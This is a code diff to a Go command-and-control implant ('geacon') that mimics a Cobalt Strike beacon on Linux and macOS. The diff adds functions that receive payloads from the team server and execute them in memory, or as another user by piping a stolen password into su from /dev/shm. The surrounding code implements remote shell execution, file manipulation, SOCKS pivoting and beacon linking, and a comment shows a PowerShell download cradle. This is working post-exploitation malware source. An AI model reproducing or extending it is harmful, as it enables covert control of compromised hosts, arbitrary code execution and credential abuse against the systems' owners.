@@ -2,102 +2,102 @@ package packet
 
 import (
 	"bytes"
+	"encoding/base64"
 	"encoding/binary"
 	"fmt"
-	"geacon/cmd/util"
 	"geacon/cmd/config"
+	"geacon/cmd/util"
+	"geacon/cmd/util/memexec"
 	"io"
 	"io/ioutil"
+	"net"
 	"os"
 	"os/exec"
 	"os/user"
 	"path/filepath"
 	"runtime"
 	"strings"
-	"net"
 	"time"
-	"encoding/base64"
 	"unicode/utf16"
-	"unicode/utf8"
 
-	"github.com/shirou/gopsutil/v3/disk"
-	"github.com/shirou/gopsutil/v3/process"
+	"github.com/moby/sys/mountinfo"
 )
 
 const (
-	CMD_TYPE_SPAWN					= 1		// TODO
-	CMD_TYPE_EXIT        			= 3		// IMPLEMENTED
-	CMD_TYPE_SLEEP        			= 4		// IMPLEMENTED 
-	CMD_TYPE_CD           			= 5		// IMPLEMENTED
-	CMD_TYPE_DATA_JITTER  			= 6		// TODO
-	CMD_TYPE_CHECKIN	  			= 8		// WONTFIX: only required for DNS beacons
-	CMD_TYPE_DLL_INJECT				= 9		// WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
-	CMD_TYPE_UPLOAD_START 			= 10	// IMPLEMENTED
-	CMD_TYPE_DOWNLOAD     			= 11	// IMPLEMENTED
-	CMD_TYPE_SOCKS_FWD				= 14	// TBD
-	CMD_TYPE_SOCKS_SEND				= 15	// TBD
-	CMD_TYPE_SOCKS_DIE				= 16	// TBD
-	CMD_TYPE_PIPE_FWD				= 22 	// IMPLEMENTED, is it, tho? Returned after forwarding linked beacon traffic to team server. Should be (target int, data []byte)
-	CMD_TYPE_GETUID		  			= 27	// IMPLEMENTED
-	CMD_TYPE_REVTOSELF				= 28	// IMPLEMENTED
-	CMD_TYPE_LIST_PROCESS 			= 32	// IMPLEMENTED
-	CMD_TYPE_PWSH_IMPORT			= 37  	// IMPLEMENTED
-	CMD_TYPE_RUNAS					= 38	// IMPLEMENTED
-	CMD_TYPE_PWD          			= 39	// IMPLEMENTED
-	CMD_TYPE_JOB_KILL				= 42	// TODO: requires job control to be implemented
-	CMD_TYPE_DLL_INJECT_64			= 43	// WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
-	CMD_TYPE_SPAWN_64				= 44	// TODO
-	CMD_TYPE_IP_CONFIG	  			= 48	// TODO
-	CMD_TYPE_LOGIN_USER				= 49	// IMPLEMENTED: Use as password setter function 	
-	CMD_TYPE_PORT_FWD				= 50 	// TODO
-	CMD_TYPE_PORT_FWD_STOP			= 51	// TODO
-	CMD_TYPE_FILE_BROWSE  			= 53	// IMPLEMENTED
-	CMD_TYPE_DRIVES		  			= 55	// IMPLEMENTED
-	CMD_TYPE_RM			  			= 56	// IMPLEMENTED
-	CMD_TYPE_UPLOAD_LOOP  			= 67	// IMPLEMENTED
-	CMD_TYPE_LINK_EXPLICIT			= 68	// TBD, SMB communication if possible
-	CMD_TYPE_CP			  			= 73	// IMPLEMENTED
-	CMD_TYPE_MV			  			= 74	// IMPLEMENTED
-	CMD_TYPE_RUN_UNDER				= 76	// TBD, injection into UNIX processes might be out of scope of this project
-	CMD_TYPE_GET_PRIVS	  			= 77	// TODO
-	CMD_TYPE_SHELL        			= 78	// IMPLEMENTED
-	CMD_TYPE_HOST_PWSH_IMP			= 79 	// sends the port number where the file set by powershell-import should be hosted locally
-	CMD_TYPE_LOAD_DLL				= 80	// WONTFIX: DLL only applies to windows clients. Maybe enable loading of shared object files?
-	CMD_TYPE_REG_QUERY				= 81	// WONTFIX: No Registry on UNIX
-	CMD_TYPE_PIVOT_LISTEN			= 82	// TBD
-	CMD_TYPE_CONNECT	  			= 86	// IMPLEMENTED
-	CMD_TYPE_INLINE_EXEC			= 95	// WONTFIX: loading assemblies into memory and executing them is not in scope for this project for now
+	CMD_TYPE_SPAWN         = 1  // TODO
+	CMD_TYPE_EXIT          = 3  // IMPLEMENTED
+	CMD_TYPE_SLEEP         = 4  // IMPLEMENTED
+	CMD_TYPE_CD            = 5  // IMPLEMENTED
+	CMD_TYPE_DATA_JITTER   = 6  // TODO
+	CMD_TYPE_CHECKIN       = 8  // WONTFIX: only required for DNS beacons
+	CMD_TYPE_DLL_INJECT    = 9  // WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
+	CMD_TYPE_UPLOAD_START  = 10 // IMPLEMENTED
+	CMD_TYPE_DOWNLOAD      = 11 // IMPLEMENTED
+	CMD_TYPE_SOCKS_FWD     = 14 // TBD
+	CMD_TYPE_SOCKS_SEND    = 15 // TBD
+	CMD_TYPE_SOCKS_DIE     = 16 // TBD
+	CMD_TYPE_PIPE_FWD      = 22 // IMPLEMENTED, is it, tho? Returned after forwarding linked beacon traffic to team server. Should be (target int, data []byte)
+	CMD_TYPE_GETUID        = 27 // IMPLEMENTED
+	CMD_TYPE_REVTOSELF     = 28 // IMPLEMENTED
+	CMD_TYPE_LIST_PROCESS  = 32 // IMPLEMENTED
+	CMD_TYPE_PWSH_IMPORT   = 37 // IMPLEMENTED
+	CMD_TYPE_RUNAS         = 38 // IMPLEMENTED
+	CMD_TYPE_PWD           = 39 // IMPLEMENTED
+	CMD_TYPE_JOB_KILL      = 42 // TODO: requires job control to be implemented
+	CMD_TYPE_DLL_INJECT_64 = 43 // WONTFIX: DLL injection is not an option for non-windows clients. Maybe shared library objects might be an alternative?
+	CMD_TYPE_SPAWN_64      = 44 // TODO
+	CMD_TYPE_IP_CONFIG     = 48 // TODO
+	CMD_TYPE_LOGIN_USER    = 49 // IMPLEMENTED: Use as password setter function
+	CMD_TYPE_PORT_FWD      = 50 // TODO
+	CMD_TYPE_PORT_FWD_STOP = 51 // TODO
+	CMD_TYPE_FILE_BROWSE   = 53 // IMPLEMENTED
+	CMD_TYPE_DRIVES        = 55 // IMPLEMENTED
+	CMD_TYPE_RM            = 56 // IMPLEMENTED
+	CMD_TYPE_UPLOAD_LOOP   = 67 // IMPLEMENTED
+	CMD_TYPE_LINK_EXPLICIT = 68 // TBD, SMB communication if possible
+	CMD_TYPE_CP            = 73 // IMPLEMENTED
+	CMD_TYPE_MV            = 74 // IMPLEMENTED
+	CMD_TYPE_RUN_UNDER     = 76 // TBD, injection into UNIX processes might be out of scope of this project
+	CMD_TYPE_GET_PRIVS     = 77 // TODO
+	CMD_TYPE_SHELL         = 78 // IMPLEMENTED
+	CMD_TYPE_HOST_PWSH_IMP = 79 // sends the port number where the file set by powershell-import should be hosted locally
+	CMD_TYPE_LOAD_DLL      = 80 // WONTFIX: DLL only applies to windows clients. Maybe enable loading of shared object files?
+	CMD_TYPE_REG_QUERY     = 81 // WONTFIX: No Registry on UNIX
+	CMD_TYPE_PIVOT_LISTEN  = 82 // TBD
+	CMD_TYPE_CONNECT       = 86 // IMPLEMENTED
+	CMD_TYPE_SPAWNAS_64    = 94 // TODO
+	CMD_TYPE_INLINE_EXEC   = 95 // WONTFIX: loading assemblies into memory and executing them is not in scope for this project for now
 	// CMD_TYPE_DISCONNECT	  		= ??
 
-	BEACON_RSP_OUTPUT_KEYSTROKES	    = 1
-	BEACON_RSP_DOWNLOAD_START	        = 2
-	BEACON_RSP_OUTPUT_SCREENSHOT	    = 3
-	BEACON_RSP_SOCKS_DIE	            = 4
-	BEACON_RSP_SOCKS_WRITE	         	= 5
-	BEACON_RSP_SOCKS_RESUME	        	= 6
-	BEACON_RSP_SOCKS_PORTFWD	        = 7
-	BEACON_RSP_DOWNLOAD_WRITE	        = 8
-	BEACON_RSP_DOWNLOAD_COMPLETE	    = 9
-	BEACON_RSP_BEACON_LINK	          	= 10
-	BEACON_RSP_DEAD_PIPE	            = 11
-	BEACON_RSP_BEACON_CHECKIN	        = 12
-	BEACON_RSP_BEACON_POST_ERROR	  	= 13
-	BEACON_RSP_PIPES_PING		        = 14
-	BEACON_RSP_BEACON_IMPERSONATED	  	= 15
-	BEACON_RSP_BEACON_GETUID	        = 16
-	BEACON_RSP_BEACON_OUTPUT_PS	    	= 17
-	BEACON_RSP_ERROR_CLOCK_SKEW	    	= 18
-	BEACON_RSP_BEACON_GETCWD	        = 19
-	BEACON_RSP_BEACON_OUTPUT_JOBS	    = 20
-	BEACON_RSP_BEACON_OUTPUT_HASHES		= 21
-	BEACON_RSP_FILE_BROWSE_RESULT     	= 22
-	BEACON_RSP_SOCKS_ACCEPT	        	= 23
-	BEACON_RSP_BEACON_OUTPUT_NET	    = 24
-	BEACON_RSP_BEACON_OUTPUT_PORTSCAN	= 25
-	BEACON_RSP_BEACON_EXIT	          	= 26
-	BEACON_RSP_OUTPUT	                = 30
-	BEACON_RSP_BEACON_ERROR				= 31
-	BEACON_RSP_OUTPUT_UTF8				= 32
+	BEACON_RSP_OUTPUT_KEYSTROKES      = 1
+	BEACON_RSP_DOWNLOAD_START         = 2
+	BEACON_RSP_OUTPUT_SCREENSHOT      = 3
+	BEACON_RSP_SOCKS_DIE              = 4
+	BEACON_RSP_SOCKS_WRITE            = 5
+	BEACON_RSP_SOCKS_RESUME           = 6
+	BEACON_RSP_SOCKS_PORTFWD          = 7
+	BEACON_RSP_DOWNLOAD_WRITE         = 8
+	BEACON_RSP_DOWNLOAD_COMPLETE      = 9
+	BEACON_RSP_BEACON_LINK            = 10
+	BEACON_RSP_DEAD_PIPE              = 11
+	BEACON_RSP_BEACON_CHECKIN         = 12
+	BEACON_RSP_BEACON_POST_ERROR      = 13
+	BEACON_RSP_PIPES_PING             = 14
+	BEACON_RSP_BEACON_IMPERSONATED    = 15
+	BEACON_RSP_BEACON_GETUID          = 16
+	BEACON_RSP_BEACON_OUTPUT_PS       = 17
+	BEACON_RSP_ERROR_CLOCK_SKEW       = 18
+	BEACON_RSP_BEACON_GETCWD          = 19
+	BEACON_RSP_BEACON_OUTPUT_JOBS     = 20
+	BEACON_RSP_BEACON_OUTPUT_HASHES   = 21
+	BEACON_RSP_FILE_BROWSE_RESULT     = 22
+	BEACON_RSP_SOCKS_ACCEPT           = 23
+	BEACON_RSP_BEACON_OUTPUT_NET      = 24
+	BEACON_RSP_BEACON_OUTPUT_PORTSCAN = 25
+	BEACON_RSP_BEACON_EXIT            = 26
+	BEACON_RSP_OUTPUT                 = 30
+	BEACON_RSP_BEACON_ERROR           = 31
+	BEACON_RSP_OUTPUT_UTF8            = 32
 )
 
 var (
@@ -154,15 +154,6 @@ func Shell(path string, args []byte) []byte {
 	var argsArray []string
 	fmt.Printf("Running %s with the arguments '%s'\n", path, args)
 	switch runtime.GOOS {
-	case "windows":
-		args = bytes.Trim(args, " ")
-		argsArray := strings.Split(string(args), " ")
-		cmd := exec.Command(path, argsArray...)
-		out, err := cmd.CombinedOutput()
-		if err != nil {
-			fmt.Sprintf("exec failed with %s\n", err)
-		}
-		return out
 	case "darwin":
 		path = "/bin/bash"
 		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
@@ -179,14 +170,13 @@ func Shell(path string, args []byte) []byte {
 		// take the command, but prepend it with a su command to run as a another user
 		// echo '123456' | su - dummyuser -c "pwd; ls -al"
 
-
 	}
 	var cmd *exec.Cmd
 	var cradle string
 	if config.StoredCredentials != nil {
 		// take the command, but prepend it with a su command to run as a another user
 		// echo '123456' | su - dummyuser -c "pwd; ls -al"
-		
+
 		cradle = fmt.Sprintf("echo '%s' | su - %s -c \"$$CMD$$\"", config.StoredCredentials.Password, config.StoredCredentials.Username)
 	}
 	if strings.HasPrefix(fmt.Sprintf("%s", args), "powershell") {
@@ -199,8 +189,8 @@ func Shell(path string, args []byte) []byte {
 		}
 		fmt.Printf("Powershell command is: %s\n", pwshCmd)
 		if config.ShellPreLoadedFile != "" {
-			// command starts with download cradle like: 
-			// IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:33616/'); 
+			// command starts with download cradle like:
+			// IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:33616/');
 
 			cradleStartPos := bytes.Index([]byte(pwshCmd), []byte("/'); "))
 			pwshCmd = string([]byte(pwshCmd)[cradleStartPos+4:])
@@ -261,14 +251,14 @@ func ParseRunAs(b []byte) []byte {
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return nil
-	} 
+	}
 	domainLength := ReadInt(domainLengthBuf)
 	domainBuf := make([]byte, domainLength)
 	_, err = buf.Read(domainBuf)
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return nil
-	} 
+	}
 	domain := string(domainBuf)
 
 	usernameLengthBuf := make([]byte, 4)
@@ -276,14 +266,14 @@ func ParseRunAs(b []byte) []byte {
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return nil
-	} 
+	}
 	usernameLength := ReadInt(usernameLengthBuf)
 	usernameBuf := make([]byte, usernameLength)
 	_, err = buf.Read(usernameBuf)
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return nil
-	} 
+	}
 	username := string(usernameBuf)
 
 	passwordLengthBuf := make([]byte, 4)
@@ -291,14 +281,14 @@ func ParseRunAs(b []byte) []byte {
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return nil
-	} 
+	}
 	passwordLength := ReadInt(passwordLengthBuf)
 	passwordBuf := make([]byte, passwordLength)
 	_, err = buf.Read(passwordBuf)
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return nil
-	} 
+	}
 	password := string(passwordBuf)
 
 	commandLengthBuf := make([]byte, 4)
@@ -306,19 +296,19 @@ func ParseRunAs(b []byte) []byte {
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return nil
-	} 
+	}
 	commandLength := ReadInt(commandLengthBuf)
 	commandBuf := make([]byte, commandLength)
 	_, err = buf.Read(commandBuf)
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return nil
-	} 
+	}
 	command := string(commandBuf)
 
 	// store old StoredCredentials temporarily, set them to the one's we received, and restore after we are done
 	tempStoredCredentials := config.StoredCredentials
-	
+
 	fmt.Printf("Setting credentials for user \"%s\\%s:%s\"", domain, username, password)
 	config.StoredCredentials = &config.StoredCredential{domain, username, password}
 
@@ -382,7 +372,8 @@ func RemoveFile(path []byte) {
 }
 
 func ListDrives() []byte {
-	partitions, err := disk.Partitions(true)
+	partitions, err := mountinfo.GetMounts(nil)
+	fmt.Printf("%s\n", partitions)
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return nil
@@ -442,69 +433,220 @@ func ParseCommandCopyMove(b []byte) ([]byte, []byte) {
 
 func CopyFile(fromPath, toPath []byte) {
 	in, err := os.Open(string(fromPath))
-    if err != nil {
-        fmt.Printf("File Open error: %s\n", err)
-		processErrorTest(13, 0, 0, fmt.Sprintf("File open error: %s", err) )
-    } else {
+	if err != nil {
+		fmt.Printf("File Open error: %s\n", err)
+		processErrorTest(13, 0, 0, fmt.Sprintf("File open error: %s", err))
+	} else {
 		out, err := os.Create(string(toPath))
 		if err != nil {
 			fmt.Printf("File Open error: %s\n", err)
-			processErrorTest(13, 0, 0, fmt.Sprintf("File open error: %s", err) )
-	
+			processErrorTest(13, 0, 0, fmt.Sprintf("File open error: %s", err))
+
 		} else {
 			_, err = io.Copy(out, in)
 			if err != nil {
 				fmt.Printf("File Copy error: %s\n", err)
-				processErrorTest(13, 0, 0, fmt.Sprintf("File copy error: %s", err) )
+				processErrorTest(13, 0, 0, fmt.Sprintf("File copy error: %s", err))
 			}
 		}
 		defer out.Close()
 	}
-    defer in.Close()
+	defer in.Close()
+	in.Sync()
 }
 
 func MoveFile(oldLocation, newLocation []byte) {
 	err := os.Rename(string(oldLocation), string(newLocation))
 	if err != nil {
 		fmt.Printf("File Move error: %s\n", err)
-		processErrorTest(14, 0, 0, fmt.Sprintf("File move error: %s", err) )
+		processErrorTest(14, 0, 0, fmt.Sprintf("File move error: %s", err))
 	}
 }
 
 func ListProcesses() []byte {
-	processList, err := process.Processes()
+	var path string
+	switch runtime.GOOS {
+	case "darwin":
+		path = "/bin/bash"
+	case "linux":
+		pathRes, err := exec.LookPath("bash")
+		if err != nil {
+			path = "/bin/sh"
+		} else {
+			path = pathRes
+		}
+	}
+
+	// params := " -c 'ps ax -o ppid,pid,ruser,cmd'"
+	params := []string{"-c", "ps ax -o '%P|%p|%u|%a'"}
+	cmd := exec.Command(path, params...)
+	// cmd := exec.Command(params)
+	fmt.Printf("%s\n", cmd)
+	out, err := cmd.CombinedOutput()
 	if err != nil {
 		fmt.Printf("Process list error: %s\n", err)
 		return nil
 	}
-
 	var sb strings.Builder
 
-	for _, processEntity := range processList {
-		parent, err := processEntity.Ppid()
-		if err != nil {
-			fmt.Printf("Error getting process parent: %s\n", err)
-		} 
-		name, err := processEntity.Name()
-		if err != nil {
-			fmt.Printf("Error getting process name: %s\n", err)
-		} 
-		username, err := processEntity.Username()
-		if err != nil {
-			fmt.Printf("Error getting process user: %s\n", err)
-		} 
+	lines := strings.Split(string(out), "\n")
+	for _, l := range lines[1:] {
+		if l == "" {
+			continue
+		}
+		proc := strings.SplitN(string(l), "|", 4)
+		ppid := strings.TrimSpace(proc[0])
+		pid := strings.TrimSpace(proc[1])
+		username := strings.TrimSpace(proc[2])
+		commandline := strings.TrimSpace(proc[3])
+		fmt.Printf("PPID is %s\nPID is %s\nUSER is %s\nCMD is %s\n\n", ppid, pid, username, commandline)
+
 		// for whatever reason, Cobalt Strike expects the output in the format
 		// PPID <TAB> PID <TAB> Name <TAB> Arch <TAB> Session <TAB> User
 		//
 		// As arch and session are not really a thing in UNIX, we just leave these fields blank
-		sb.WriteString(fmt.Sprintf("%s\t%d\t%d\t\t%s\n", name, parent, processEntity.Pid, username))
+		sb.WriteString(fmt.Sprintf("%s\t%s\t%s\t\t%s\n", commandline, ppid, pid, username))
 	}
 
 	return []byte(sb.String())
 }
 
+func Spawn(arch string, b []byte) {
+	if CheckBeaconMagicBytes((b[:4])) {
+		processErrorTest(0, 0, 0, "Received Windows beacon DLL, aborting")
+	} else {
+		fmt.Printf("Spawning new process for arch %s\n", arch)
+		exe, err := memexec.New(b)
+		if err != nil {
+			fmt.Println(err.Error())
+			panic(err)
+		}
+		defer exe.Close()
+
+		cmd := exe.Command()
+		// run detached
+		err = cmd.Start()
+		if err != nil {
+			panic(err)
+		}
+		err = cmd.Process.Release()
+		if err != nil {
+			fmt.Println(err.Error())
+		}
+		fmt.Printf("Spawned new process successfully!\n")
+	}
+}
+
+func SpawnAs(arch string, b []byte) {
+	buf := bytes.NewBuffer(b)
+
+	// domain
+	domainLenBytes := make([]byte, 4)
+	_, err := buf.Read(domainLenBytes)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		// panic(err)
+	}
+	domainLen := ReadInt(domainLenBytes)
+	domain := make([]byte, domainLen)
+	_, err = buf.Read(domain)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		// panic(err)
+	}
+
+	// username
+	usernameLenBytes := make([]byte, 4)
+	_, err = buf.Read(usernameLenBytes)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		// panic(err)
+	}
+	usernameLen := ReadInt(usernameLenBytes)
+	username := make([]byte, usernameLen)
+	_, err = buf.Read(username)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		// panic(err)
+	}
+
+	// password
+	passwordLenBytes := make([]byte, 4)
+	_, err = buf.Read(passwordLenBytes)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		// panic(err)
+	}
+	passwordLen := ReadInt(passwordLenBytes)
+	password := make([]byte, passwordLen)
+	_, err = buf.Read(password)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		// panic(err)
+	}
+
+	payload := make([]byte, buf.Len())
+	_, err = buf.Read(payload)
+	if err != nil {
+		processErrorTest(0, 0, 0, err.Error())
+		// panic(err)
+	}
+
+	fmt.Printf("HEADER: [%x]\n", payload[:4])
+
+	if CheckBeaconMagicBytes((payload[:4])) {
+		processErrorTest(0, 0, 0, "Received Windows beacon DLL, aborting")
+	} else {
+
+		fmt.Printf("Spawning new process for arch %s\n", arch)
+		exe, err := memexec.New(payload)
+		if err != nil {
+			fmt.Println(err.Error())
+			panic(err)
+		}
+		defer exe.Close()
+
+		fmt.Printf("Attempting to run as user %s.\nCopying file to /dev/shm to execute as another user.\n", username)
+		path := fmt.Sprintf("/dev/shm/%d", os.Getpid())
+
+		CopyFile([]byte(exe.File().Name()), []byte(path))
+		err = os.Chmod(path, 0o555)
+		if err != nil {
+			panic(err)
+		}
+
+		fmt.Printf("PATH: %s", path)
+
+		cradle := fmt.Sprintf("echo '%s' | su - %s -c %s", password, username, path)
+		args := []string{"-c", cradle}
+		cmd := exec.Command("/bin/sh", args...)
+
+		// run detached
+		fmt.Printf("CMD is: %s\n", cmd.Args)
+		time.Sleep(30 * time.Second)
+
+		err = cmd.Start()
+		if err != nil {
+			panic(err)
+		}
+		// err = cmd.Process.Release()
+		// if err != nil {
+		// 	fmt.Println(err.Error())
+		// }
+		fmt.Printf("%d\n", cmd.Process.Pid)
+
+		// err = os.Remove(path)
+		// if err != nil {
+		// 	processErrorTest(0, 0, 0, err.Error())
+		// }
+		// fmt.Printf("Cleaning up file %s .\n", path)
+
+		fmt.Printf("Spawned new process successfully!\n")
+	}
+}
+
 func ParseCommandConnect(b []byte) ([]byte, uint16) {
-	// data is 2 Bytes for port, 4 Bytes for Address. 
+	// data is 2 Bytes for port, 4 Bytes for Address.
 	// As there is no data in the buffer apart from that, we just use buf.Len() to get the remainder of available bytes for the address.
 	buf := bytes.NewBuffer(b)
 
@@ -539,7 +681,7 @@ func ConnectTcpBeacon(addr []byte, port uint16) (int, []byte) {
 	var beaconId int
 	var encryptedMetaInfo []byte
 
-	dialer := net.Dialer{Timeout: 5*time.Millisecond}
+	dialer := net.Dialer{Timeout: 5 * time.Millisecond}
 	fmt.Printf("Initiating connection to %s:%d\n", addr, port)
 	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", addr, port))
 	if err != nil {
@@ -547,7 +689,7 @@ func ConnectTcpBeacon(addr []byte, port uint16) (int, []byte) {
 		processErrorTest(68, 0, 0, "")
 		// panic(err)
 		return -1, nil
-    } else {
+	} else {
 		initialMessage := make([]byte, 4)
 		bytesRead, err := conn.Read(initialMessage)
 		if err != nil {
@@ -557,7 +699,7 @@ func ConnectTcpBeacon(addr []byte, port uint16) (int, []byte) {
 			return -1, nil
 		} else {
 			fmt.Printf("Read %d Bytes.\nMessage is %x\n", bytesRead, initialMessage)
-	
+
 			message := make([]byte, 140)
 			bytesRead, err = conn.Read(message)
 			if err != nil {
@@ -568,25 +710,25 @@ func ConnectTcpBeacon(addr []byte, port uint16) (int, []byte) {
 				trimmedMessage := message[:bytesRead]
 				fmt.Printf("Read %d Bytes.\nMessage is %x\n", bytesRead, trimmedMessage)
 				fmt.Printf("[ATT]: %d bytes left to read!\nData not read: %x\n\n", len(message[bytesRead:]), message[bytesRead:])
-			
+
 				// attempt to xor the second message with the first as a key
 				// unmaskedMessage := unmask(util.BytesCombine(initialMessage, trimmedMessage))
-			
+
 				fmt.Printf("Let's assume we start with a beacon ID, which is apparently a LittleEndian UInt32, and therefore 4 bytes long \n")
 				buf := bytes.NewBuffer(trimmedMessage)
 				beaconIdLen := make([]byte, 4)
 				buf.Read(beaconIdLen)
 				beaconId = int(ReadLittleInt(beaconIdLen))
 				fmt.Printf("Beacon ID  %d\n", beaconId)
-			
+
 				// The rest of the payload are 128 bytes, the exact length allowed for RSA decrypt on the team server. Coincidence? I think not!
 				encryptedMetaInfo = trimmedMessage[4:132]
 				fmt.Printf("Beacon metainfo  %x\n", encryptedMetaInfo)
-			
+
 				AddTcpBeaconLink(beaconId, conn, 0, encryptedMetaInfo)
 				return beaconId, encryptedMetaInfo
 			}
-		}	
+		}
 	}
 
 	// return beaconId, encryptedMetaInfo
@@ -595,8 +737,8 @@ func ConnectTcpBeacon(addr []byte, port uint16) (int, []byte) {
 
 func ParsePipeForward(b []byte) (uint32, []byte) {
 	// Current assumption:
-	// First 4 Bytes is beacon ID, followed by another 4 bytes for the 
-	// length of the command, and n bytes for the actual command. 
+	// First 4 Bytes is beacon ID, followed by another 4 bytes for the
+	// length of the command, and n bytes for the actual command.
 
 	var cmdBuf []byte
 	buf := bytes.NewBuffer(b)
@@ -634,7 +776,6 @@ func ParsePipeForward(b []byte) (uint32, []byte) {
 	} else {
 		cmdBuf = []byte{00, 00, 00, 00}
 	}
-	
 
 	fmt.Printf("cmdBuf for beacon %d is %s\n", beaconId, cmdBuf)
 
@@ -685,7 +826,7 @@ func ParseSocksInitTraffic(b []byte) []byte {
 		return nil
 	}
 
-	conn , err := net.DialTCP("tcp", nil, addr)
+	conn, err := net.DialTCP("tcp", nil, addr)
 	if err != nil {
 		fmt.Printf("ERROR DIALING ADDR: %s\n", err.Error())
 		processErrorTest(68, 0, 0, fmt.Sprintf("%s:%d", addr.IP, addr.Port))
@@ -694,7 +835,6 @@ func ParseSocksInitTraffic(b []byte) []byte {
 	sess := &config.SocksSession{int(clientId), origAddr, int(port), conn, nil}
 	config.SocksSessions = append(config.SocksSessions, sess)
 	go SocksResListen(sess)
-
 
 	fmt.Printf("Client %d wants to send data to %s:%d\n", clientId, addr, port)
 	// return MakePacket(BEACON_RSP_SOCKS_ACCEPT, append(WriteLittleInt(1337), clientIdBuf...))
@@ -748,7 +888,7 @@ func ParseSocksDie(b []byte) []byte {
 				config.SocksSessions[i].Conn.Close()
 				// reslicing to remove closed connection
 				config.SocksSessions[i] = config.SocksSessions[len(config.SocksSessions)-1]
-    			config.SocksSessions = config.SocksSessions[:len(config.SocksSessions)-1]
+				config.SocksSessions = config.SocksSessions[:len(config.SocksSessions)-1]
 				result := MakePacket(BEACON_RSP_SOCKS_DIE, WriteInt(int(clientId)))
 				return result
 			}
@@ -758,7 +898,7 @@ func ParseSocksDie(b []byte) []byte {
 }
 
 func ParseLoginUser(b []byte) bool {
-	// packet is build up: [length of domain (4 bytes)][domain][length of username (4 bytes)][username][length of password (4 bytes)][password] 
+	// packet is build up: [length of domain (4 bytes)][domain][length of username (4 bytes)][username][length of password (4 bytes)][password]
 	buf := bytes.NewBuffer(b)
 
 	domainLengthBuf := make([]byte, 4)
@@ -766,14 +906,14 @@ func ParseLoginUser(b []byte) bool {
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return false
-	} 
+	}
 	domainLength := ReadInt(domainLengthBuf)
 	domainBuf := make([]byte, domainLength)
 	_, err = buf.Read(domainBuf)
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return false
-	} 
+	}
 	domain := string(domainBuf)
 
 	usernameLengthBuf := make([]byte, 4)
@@ -781,14 +921,14 @@ func ParseLoginUser(b []byte) bool {
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return false
-	} 
+	}
 	usernameLength := ReadInt(usernameLengthBuf)
 	usernameBuf := make([]byte, usernameLength)
 	_, err = buf.Read(usernameBuf)
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return false
-	} 
+	}
 	username := string(usernameBuf)
 
 	passwordLengthBuf := make([]byte, 4)
@@ -796,14 +936,14 @@ func ParseLoginUser(b []byte) bool {
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return false
-	} 
+	}
 	passwordLength := ReadInt(passwordLengthBuf)
 	passwordBuf := make([]byte, passwordLength)
 	_, err = buf.Read(passwordBuf)
 	if err != nil {
 		processErrorTest(0, 0, 0, err.Error())
 		return false
-	} 
+	}
 	password := string(passwordBuf)
 
 	fmt.Printf("Setting credentials for user \"%s\\%s:%s\"", domain, username, password)
@@ -969,12 +1109,11 @@ func File_Browse(b []byte) []byte {
 // 74 = "could not spawn " + errMsgBytes + " (token) with extended startup information. Reset ppid, disable blockdlls, or rev2self to drop your token."
 // 75 = "current process will not auto-elevate COM object. Try from a program that lives in c:\\windows\\*"
 
-
 func processErrorTest(errId int, errArg1 int, errArg2 int, err string) {
 	fmt.Printf("Error with code %d received\n", errId)
 
-	errIdBytes := WriteInt(errId) // must be zero
-	arg1Bytes := WriteInt(errArg1)  // for debug
+	errIdBytes := WriteInt(errId)  // must be zero
+	arg1Bytes := WriteInt(errArg1) // for debug
 	arg2Bytes := WriteInt(errArg2)
 	errMsgBytes := []byte(err)
 	result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
@@ -990,7 +1129,7 @@ func UTF16BytesToString(b []byte, o binary.ByteOrder) string {
 		utf[i/2] = o.Uint16(b[i:])
 	}
 	if len(b)/2 < len(utf) {
-		utf[len(utf)-1] = utf8.RuneError
+		utf[len(utf)-1] = '\uFFFD'
 	}
 	return string(utf16.Decode(utf))
 }
@@ -1021,4 +1160,15 @@ func HostFileLocally(port int, file []byte) {
 		defer conn.Close()
 		conn.Write([]byte(fmt.Sprintf("HTTP/1.1 200 OK\n\n %s", file)))
 	}() // Note the parentheses. We must call the anonymous function.
+}
+
+func CheckBeaconMagicBytes(b []byte) bool {
+	nullSlice := []byte{52, 100, 53, 97}
+	for i, v := range b {
+		if v != nullSlice[i] {
+			return false
+		}
+	}
+	return true
+
 }
